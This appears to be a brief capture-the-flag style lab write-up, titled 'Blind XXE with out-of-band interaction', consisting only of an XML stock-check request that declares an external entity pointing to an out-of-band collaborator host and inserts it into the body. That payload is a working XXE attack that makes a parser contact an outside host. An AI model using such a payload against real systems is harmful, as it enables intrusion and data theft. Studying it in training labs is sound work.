---
title: "3 - Blind XXE with out-of-band interaction"
---

# 3 - Blind XXE with out-of-band interaction

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "https://1sunucm7ot9sjzclrzoze0bpfgl79xxm.oastify.com">]>
<stockCheck>
<productId>1</productId><storeId>1</storeId>
<root>
&test;</root>
</stockCheck>
```
